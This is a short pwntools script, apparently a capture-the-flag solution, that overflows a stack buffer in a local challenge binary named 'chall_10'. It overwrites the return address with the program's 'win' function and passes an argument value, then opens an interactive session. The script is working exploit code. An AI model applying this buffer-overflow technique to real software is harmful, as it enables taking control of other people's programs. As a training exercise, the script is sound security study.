# coding: utf-8
from pwn import *
p = process("./chall_10")
elf = ELF("./chall_10")
win = elf.sym.win
payload = b"A"*780 + p32(win) + b"A"*4 + p32(0x1a55fac3)
p.recv()
p.sendline(payload)
p.interactive()
